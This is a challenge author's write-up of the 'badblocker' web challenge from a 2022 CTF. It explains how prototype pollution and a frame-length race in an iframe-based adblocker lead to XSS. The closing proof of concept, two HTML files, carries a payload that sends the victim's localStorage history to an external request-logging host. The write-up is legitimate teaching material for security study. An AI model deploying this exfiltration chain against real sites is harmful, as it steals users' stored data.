---
layout: post
title:  "🅱️ad🅱️locker"
author: "me"
date:   2023-04-27 00:00:00 +0000
categories: ctf idekctf web
description: "YEP"
---

*[Challenge](https://ctf.idek.team/), [Source code](https://storage.googleapis.com/idekctf-challenges/uploads/746d7cf2fd196a9d5e266e71e3a770c7d088a97a64b05dbbae1f6c5f13401907/badblocker.tar.gz), [CTFtime event](https://ctftime.org/event/1839). Site is dead :(*  

Millennia ago, I wrote a challenge for idekCTF 2022*. Here's the writeup!

---  

# The Writeup

The app was some extensionless adblocker which tried to work by framing a given page and redirecting all of its subframes. Of course, this didn't account for ads in different tags or framing protections on the page (eg `X-Frame-Options` or `frame-ancestors`), rendering this practically useless. However, this led to some interesting behaviours, making this perfect for a CTF challenge :D

> Note that this subframe redirection is only possible if one of the redirected page's ancestors is the one doing the redirecting. Notably, this means that you can't do any redirecting via opener relations. This is unrelated to the vulnerabilities in the challenge.

When you visit a page with this adblocker, the url of that page, date and number of ads blocked (calculated very generously in order to bloat the numbers) were saved in your blockHistory™. The flag was stored in the blockHistory™ of the admin.

With this in mind, here's the implementation for clearing the ads from the page.

```js
// viewer.html

async function clearFrame(frame) {
    return new Promise(async (resolve) => {
        // Clear children before clearing this one
        // otherwise the navigation will remove the child frames
        let numChildren = frame.length;
        for (let i = 0; i < numChildren; i++) {
            await clearFrame(frame[i]);
        }

        // Navigate the frame to blocked.html
        if (frame !== viewer.contentWindow) frame.location.href = "/blocked.html";

        // Wait until same-origin before logging the frame name
        await sameOriginCheck(frame).then(() => {
            console.debug(frame.name || "(no name)", "blocked");
            numBlocked += numChildren;
        })
        .catch(e => console.log(e));

        resolve();
    });
}
```

The `sameOriginCheck` ensured that the frame had the same origin as the parent by repeatedly trying to read a cross-origin property (`frame.origin`) until it didn't error out, or until the timeout was exceeded:

```js
// viewer.html

async function sameOriginCheck(frame) {
    return new Promise((resolve, reject) => {
        let tries = 0;
        let check = setInterval(() => {
            // keep trying until same-origin
            tries++;
            if (tries > 250) {
                clearInterval(check);
                return reject("Maximum number of tries exceeded");
            }
            try {
                if (frame.origin === origin) {
                    clearInterval(check);
                    resolve();
                }
            } catch(e) {
                // if not same-origin, the above will throw a DOMException (expected)
                // so only throw otherwise
                if (!(e instanceof DOMException)) throw e;
            }
        }, 1);
    });
}
```

`clearFrame` clears each frame in the frame tree recursively in a depth-first search, waiting for each frame to be same-origin before logging the frame's name. It has to be same-origin, otherwise reading `frame.name` will violate cross-origin policies. Doing this recursively bloats the number of ads blocked a lot, as you might imagine, since it will count the number of child frames in each of the frames in the frame tree.

The other thing about this app is that if something can be done via `innerHTML` assignment, it **will** be done via `innerHTML` assignment. Notably, on the index page, this function is called with `preview` set to `false`:

```js
// utils.js

function showHistory(preview) {
    let historyHTML = "";
 
    if (preview) {
        // only show part of the history and URLs
        window.blockHistory = window.blockHistory.slice(0,5);
        window.blockHistory.forEach(({ url }) => {
            historyHTML += `<p><code>${encodeURI(url)}</code></p>`;
        });
        historyHTML += "<p>etc...</p>"
    } else {
        // show everything
        window.blockHistory™.forEach(({ url, numBlocked, date }) => {
            historyHTML += `<p>${date} - <code>${encodeURI(url)}</code><br>
                <b>${numBlocked} ads blocked</b></p>`;
        });
    }
 
    // snip
 
    // not a form but it looks nice :D
    document.body.innerHTML += `
        <fieldset id="historyContainer">
            <legend>History${preview ? " Preview" : ""}</legend>
            <div>${historyHTML}</div>
        </fieldset>
    `;
}
```

...and the blockHistory™ is appended to before `viewer.html` is unloaded:

```js
// viewer.html

window.addEventListener("beforeunload", () => {
    // Save the current session to history
    window.blockHistory™.push({ url, numBlocked, date });
    localStorage.setItem("blockHistory", JSON.stringify(window.blockHistory™));
});
```

We can't leverage the dangerous `innerHTML` assignment to get XSS via the url, since `encodeURI` encodes both angle brackets `<` `>` to `%3C` and `%3E`, and we're not in a context where we can add some extra attributes to a tag or some other funky thing. Additionally, the date is set via this line:

```js
// viewer.html

let date = new Date(Date.now()).toDateString();
```

...which doesn't let us get XSS either (you can try!). All that's left is `numBlocked`.

> I'd hoped that this would give the player a pretty good sense of what to try and go for.

There's only one place where `numBlocked` is modified, and it's in this function from before:

```js
// viewer.html

async function clearFrame(frame) {

        // snip

        let numChildren = frame.length;
        for (let i = 0; i < numChildren; i++) {
            await clearFrame(frame[i]);
        }

        // snip

        await sameOriginCheck(frame).then(() => {
            console.debug(frame.name || "(no name)", "blocked");
            numBlocked += numChildren;
        })

        // snip

}
```

If we can make `numChildren` a string with our payload, `numBlocked` will become a string with our payload (since an integer plus a string in JS does this). As shown in the snippet above, `numChildren` is set to `frame.length`, and `frame` is a `WindowProxy`, so `.length` refers to the `length` property in the context of that window!

> Try solving the challenge from here if you haven't already!

---

There are a fair few options from here, but none might seem to work (unless you've seen the last remaining vulnerability in this challenge, in which case the path ahead may be fairly obvious).

- Setting the `length` variable on your own hosted page and intercepting the redirection to go to your site won't work since cross-origin policies stop `frame.length` from reading from your maliciously-defined length; the page can't "see" any information on your page, and it gets that value for `frame.length` from the browser as the number of embedded frames on that page. If it could read the value you define, that would have some major security implications!
- DOM clobbering cross-origin by creating an `iframe` with `name=length` doesn't work.
- DOM clobbering length with anything doesn't work.

Additionally, nothing on any of the pages stands out as *odd* with regards to `length` (apart from the code above); there's nothing which sets something like `A.length = B` that we can hijack for our own use, so there seems to be a roadblock.

We're in need of a final puzzle piece, which happens to be here:

```js
// utils.js

function mergeHistories(history, newHistory) {
    for (const [k, v] of Object.entries(newHistory)) {
        if (typeof v === "object" && !Array.isArray(v)) {
            if (!(history[k])) history[k] = {};
            history[k] = mergeHistories(history[k], v);
        } else {
            history[k] = v;
        }
    }
    return history;
}
```

...where you control `newHistory`, here:


```js
// import-history.html

window.addEventListener("load", () => {
    let newHistory;
    try {
        newHistory = JSON.parse(
            new URLSearchParams(location.search).get("history")
        );
    } catch(e) {
        info.innerHTML = "Your history was malformed :(";
        return;
    }

    // preview the history
    mergeHistories(window.blockHistory, newHistory);
    showHistory(true);

    info.innerHTML = `<b>This will overwrite your current history</b><br>
        Click <a href=# onclick=confirm()>here</a> to confirm that you still wish to import this history`
});
```

> Note: `showHistory` is called as a preview so we can't use this to instantly get XSS/HTML injection.

This is a textbook prototype pollution vulnerability! We can provide our own history with `__proto__` set to overwrite properties on the global object, allowing us to set `.length` on any object if it doesn't already have it defined.

> Note that this bypasses cross-origin policies since the polluted object is on the same origin as the viewer page!

Unfortunately, the frames which `clearFrame` is called on are instances of `WindowProxy` objects (check [mozilla](https://developer.mozilla.org/en-US/docs/Glossary/WindowProxy)'s documentation) and `length` is already defined on `WindowProxy` objects, so we can't use prototype pollution to overwrite `length` to some value of our choosing.

If we could get `frame` to point not to a `WindowProxy` but to any other object polluted in that frame's context *without* `.length` defined, we could get `.length` to be a string of our choosing.

But how do we do this?

Remember this snippet from before:

```js
// viewer.html

        // snip
        let numChildren = frame.length;
        for (let i = 0; i < numChildren; i++) {
            await clearFrame(frame[i]);
        }
        // snip
```

We might be able to control `frame[i]`. For example, we could set up a page with one frame on it, so that `length === 1`, and then pollute the `0` property so that we control `frame[0]`. However, same problem from before: `frame[0]` is already defined (it's the embedded frame) so that will take precedence.

Can we undefine it?

If we can set up a page in such a way that the initial length reading is larger than the number of frames on the page at the time of reading `frame[i]`, then `frame[i]` may be undefined at the time of calling `clearFrame`; then our polluted properties will be read! That's the key to the challenge, and there were several ways of doing it.

# Solving

One way I saw from most of the solvers was to spam a *ton* of frames on the page, so that as `clearFrame` was called on each of the frames sequentially, it would take a longer period of time. This gave you more time to delete, say, the 1000th frame, so that by the time it got to `frame[999]`, it would be undefined, then you would go through with the whole prototype pollution. (I don't have a payload for this, otherwise I'd put it here)

The intended solution was similar but used CSPs instead to reduce the number of frames required. The method went like:

```
- embed the viewer page in an iframe so that we can control the nested iframe

- set the url to a page with 2 iframes to set the initial length of ads to 2

- the viewer will read the length = 2 and then clear both of those frames

- there is a csp that stops the navigation from going to /blocked.html - this means that the sameOriginCheck will timeout

- during this timeout, navigate the parent of the 2 iframes to point to the import-history page, which has a prototype pollution vulnerability

- as the viewer and the index page are same origin, the viewer can access the prototype polluted variables, and contentWindow[1] can be polluted (as it doesnt exist, there isnt an iframe) to an object storing any length we want

- the length is saved to localStorage, which is inserted directly into innerHTML
```

Recall that the `sameOriginCheck` from before always tries to read some cross-origin property until it doesn't error out. While it's doing this, the `clearFrame` function is stuck and it doesn't clear any other frames. This solution worked by prolonging the `clearFrame` function long enough to remove the frames (so the pollution could take place) by adding a CSP to make sure that the frame was **never** same-origin with the parent.

This CSP worked as a reference:

```html
<meta http-equiv="Content-Security-Policy" content="frame-src 'none';">
```

> Can you think of some other ways to solve this challenge? For example, there was another way that involved sandboxing the navigated iframe so that the `sameOriginCheck` would fail (sandboxed iframes are from a special origin that isn't same-origin with anything by default)!

Here's a POC:

```html
<!-- a.html -->

<iframe id=embedded></iframe>
<script>
const sleep = d => new Promise(r => setTimeout(r, d));
const main = async () => {
    SERVER = "http://127.0.0.1:1111"
    ATTACKER = "http://<you>/b.html"
    embedded.src = `${SERVER}/${encodeURIComponent(ATTACKER)}`;
    await sleep(3500);
    location = SERVER;
}
main();
</script>
```

```html
<!-- b.html -->

<head>
    <meta http-equiv="Content-Security-Policy" content="frame-src 'none';">
</head>
<script>
const sleep = d => new Promise(r => setTimeout(r, d));
const main = async () => {
    PAYLOAD = encodeURIComponent(JSON.stringify({
        ["__proto__"]: {
            "1": {
                "length": "<img src=x onerror=\"fetch(`http://1s4fqew1.requestrepo.com/`,{method:`POST`,body:`${localStorage.blockHistory}`})\">",
                "location": {},
                "name":"lol",
                "origin": parent.parent.SERVER
            }
        }
    }))
    await sleep(500);
    location = `${parent.parent.SERVER}/import-history.html?history=${PAYLOAD}`
}

main();
</script>
```

Sending the admin to `a.html` triggers the flow and yields the flag :)

# Postscript

If you played the challenge, I hope you enjoyed it! If not, hopefully this made for an interesting read. Either way, thank you very much for reading!